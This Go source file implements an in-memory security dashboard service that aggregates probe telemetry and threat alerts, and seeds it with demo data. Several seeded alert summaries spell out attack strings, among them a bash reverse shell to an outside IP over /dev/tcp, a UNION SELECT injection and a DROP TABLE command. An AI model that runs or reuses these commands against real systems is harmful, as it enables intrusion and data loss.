package dashboard

import (
	"sync"
	"time"

	"alinksec/pkg/compliance"
)

// AgentTelemetry 探针遥测数据简报
type AgentTelemetry struct {
	AgentID       string    `json:"agent_id"`
	AgentType     string    `json:"agent_type"`
	HostIP        string    `json:"host_ip"`
	Hostname      string    `json:"hostname"`
	Status        string    `json:"status"` // "ONLINE", "WARNING", "OFFLINE"
	CPUUsage      float64   `json:"cpu_usage"`
	MemoryMB      float64   `json:"memory_mb"`
	ActiveRules   int       `json:"active_rules"`
	LastHeartbeat time.Time `json:"last_heartbeat"`
}

// ThreatEventSummary 态势大屏威胁告警摘要
type ThreatEventSummary struct {
	EventID    string    `json:"event_id"`
	Timestamp  time.Time `json:"timestamp"`
	Component  string    `json:"component"`
	ThreatType string    `json:"threat_type"`
	Severity   string    `json:"severity"` // CRITICAL, HIGH, MEDIUM, LOW
	SourceIP   string    `json:"source_ip"`
	TargetHost string    `json:"target_host"`
	Summary    string    `json:"summary"`
	Action     string    `json:"action"` // "BLOCKED", "ALERTED", "HEALED"
}

// OverviewData 态势大屏总览聚合数据
type OverviewData struct {
	ClusterHealth       string                 `json:"cluster_health"` // "HEALTHY", "WARNING", "CRITICAL"
	TotalAgents         int                    `json:"total_agents"`
	OnlineAgents        int                    `json:"online_agents"`
	TotalThreatsToday   int                    `json:"total_threats_today"`
	BlockedThreatsToday int                    `json:"blocked_threats_today"`
	SeverityCounts      map[string]int         `json:"severity_counts"`
	ComponentThreats    map[string]int         `json:"component_threats"`
	Agents              []AgentTelemetry       `json:"agents"`
	RecentEvents        []ThreatEventSummary   `json:"recent_events"`
	Compliance          *compliance.EvaluationResult `json:"compliance"`
	LogStorageDays      int                    `json:"log_storage_days"` // 等保合规留存 180+
	HashChainIntegrity  bool                   `json:"hash_chain_integrity"` // 区块链哈希防篡改
}

// Service 态势感知聚合服务
type Service struct {
	mu           sync.RWMutex
	agents       map[string]AgentTelemetry
	events       []ThreatEventSummary
	evaluator    *compliance.Evaluator
	maxEventHold int
}

// NewService 初始化态势大屏服务
func NewService() *Service {
	s := &Service{
		agents:       make(map[string]AgentTelemetry),
		events:       make([]ThreatEventSummary, 0, 100),
		evaluator:    compliance.NewEvaluator(),
		maxEventHold: 50,
	}

	// 载入默认的 6 大探针基础拓扑
	s.seedDefaultAgents()
	s.seedDefaultThreats()

	return s
}

func (s *Service) seedDefaultAgents() {
	now := time.Now()
	defaults := []AgentTelemetry{
		{
			AgentID: "agent-waf-node01", AgentType: "WAF", HostIP: "192.168.10.10",
			Hostname: "edge-waf-gateway", Status: "ONLINE", CPUUsage: 1.2, MemoryMB: 28.5,
			ActiveRules: 145, LastHeartbeat: now,
		},
		{
			AgentID: "agent-cfw-node01", AgentType: "CFW", HostIP: "192.168.10.1",
			Hostname: "core-firewall", Status: "ONLINE", CPUUsage: 0.8, MemoryMB: 18.2,
			ActiveRules: 32, LastHeartbeat: now,
		},
		{
			AgentID: "agent-edr-app01", AgentType: "EDR", HostIP: "192.168.20.15",
			Hostname: "app-cluster-srv1", Status: "ONLINE", CPUUsage: 1.5, MemoryMB: 34.0,
			ActiveRules: 68, LastHeartbeat: now,
		},
		{
			AgentID: "agent-tamper-web01", AgentType: "TAMPER", HostIP: "192.168.20.16",
			Hostname: "web-portal-frontend", Status: "ONLINE", CPUUsage: 0.3, MemoryMB: 12.4,
			ActiveRules: 1250, LastHeartbeat: now,
		},
		{
			AgentID: "agent-dbaudit-db01", AgentType: "DBAUDIT", HostIP: "192.168.30.50",
			Hostname: "prod-mysql-cluster", Status: "ONLINE", CPUUsage: 1.1, MemoryMB: 22.8,
			ActiveRules: 45, LastHeartbeat: now,
		},
		{
			AgentID: "agent-log-audit01", AgentType: "LOGAUDIT", HostIP: "192.168.1.100",
			Hostname: "sec-log-collector", Status: "ONLINE", CPUUsage: 0.5, MemoryMB: 14.8,
			ActiveRules: 12, LastHeartbeat: now,
		},
		{
			AgentID: "agent-bastion-01", AgentType: "BASTION", HostIP: "192.168.1.120",
			Hostname: "bastion-4a-gateway", Status: "ONLINE", CPUUsage: 0.6, MemoryMB: 16.5,
			ActiveRules: 7, LastHeartbeat: now,
		},
	}

	for _, a := range defaults {
		s.agents[a.AgentID] = a
	}
}

func (s *Service) seedDefaultThreats() {
	now := time.Now()
	threats := []ThreatEventSummary{
		{
			EventID: "EVT-WAF-0912", Timestamp: now.Add(-2 * time.Minute), Component: "WAF",
			ThreatType: "SQL_INJECTION", Severity: "CRITICAL", SourceIP: "114.247.50.21",
			TargetHost: "192.168.10.10:80", Summary: "Union-based SQL injection detected: UNION SELECT 1,schema_name FROM information_schema",
			Action: "BLOCKED",
		},
		{
			EventID: "EVT-EDR-1043", Timestamp: now.Add(-5 * time.Minute), Component: "EDR",
			ThreatType: "REVERSE_SHELL", Severity: "CRITICAL", SourceIP: "192.168.20.15",
			TargetHost: "app-cluster-srv1", Summary: "Reverse shell execution intercepted: /bin/bash -i >& /dev/tcp/45.33.32.156/4444",
			Action: "BLOCKED",
		},
		{
			EventID: "EVT-DBA-2019", Timestamp: now.Add(-9 * time.Minute), Component: "DBAUDIT",
			ThreatType: "HIGH_RISK_DDL", Severity: "CRITICAL", SourceIP: "192.168.20.15",
			TargetHost: "prod-mysql-cluster:3306", Summary: "Malicious DDL attempted: DROP TABLE sys_customer_finance",
			Action: "BLOCKED",
		},
		{
			EventID: "EVT-CFW-3301", Timestamp: now.Add(-14 * time.Minute), Component: "CFW",
			ThreatType: "ZONE_VIOLATION", Severity: "HIGH", SourceIP: "192.168.10.15",
			TargetHost: "192.168.30.50:3306", Summary: "Cross-zone violation: DMZ untrusted host attempted direct database connection",
			Action: "BLOCKED",
		},
		{
			EventID: "EVT-TMP-4022", Timestamp: now.Add(-18 * time.Minute), Component: "TAMPER",
			ThreatType: "WEBSHELL_UPLOAD", Severity: "HIGH", SourceIP: "192.168.20.16",
			TargetHost: "web-portal-frontend", Summary: "Malicious PHP webshell uploaded to /var/www/html/uploads/shell.php",
			Action: "HEALED",
		},
	}

	s.events = append(s.events, threats...)
}

// RecordHeartbeat 更新探针心跳与状态
func (s *Service) RecordHeartbeat(telemetry AgentTelemetry) {
	s.mu.Lock()
	defer s.mu.Unlock()
	telemetry.LastHeartbeat = time.Now()
	s.agents[telemetry.AgentID] = telemetry
}

// RecordEvent 记录一条威胁安全事件
func (s *Service) RecordEvent(evt ThreatEventSummary) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if evt.Timestamp.IsZero() {
		evt.Timestamp = time.Now()
	}

	// 头部插入
	s.events = append([]ThreatEventSummary{evt}, s.events...)
	if len(s.events) > s.maxEventHold {
		s.events = s.events[:s.maxEventHold]
	}
}

// GetOverview 获取大屏聚合指标
func (s *Service) GetOverview() OverviewData {
	s.mu.RLock()
	defer s.mu.RUnlock()

	severityCounts := map[string]int{
		"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0,
	}
	componentThreats := map[string]int{
		"WAF": 0, "EDR": 0, "DBAUDIT": 0, "CFW": 0, "TAMPER": 0, "LOGAUDIT": 0, "BASTION": 0,
	}

	blockedCount := 0
	for _, e := range s.events {
		severityCounts[e.Severity]++
		componentThreats[e.Component]++
		if e.Action == "BLOCKED" || e.Action == "HEALED" {
			blockedCount++
		}
	}

	agentList := make([]AgentTelemetry, 0, len(s.agents))
	onlineCount := 0
	for _, a := range s.agents {
		agentList = append(agentList, a)
		if a.Status == "ONLINE" {
			onlineCount++
		}
	}

	compReport := s.evaluator.GenerateFullReport()

	return OverviewData{
		ClusterHealth:       "HEALTHY",
		TotalAgents:         len(s.agents),
		OnlineAgents:        onlineCount,
		TotalThreatsToday:   len(s.events),
		BlockedThreatsToday: blockedCount,
		SeverityCounts:      severityCounts,
		ComponentThreats:    componentThreats,
		Agents:              agentList,
		RecentEvents:        s.events,
		Compliance:          compReport,
		LogStorageDays:      185,
		HashChainIntegrity:  true,
	}
}
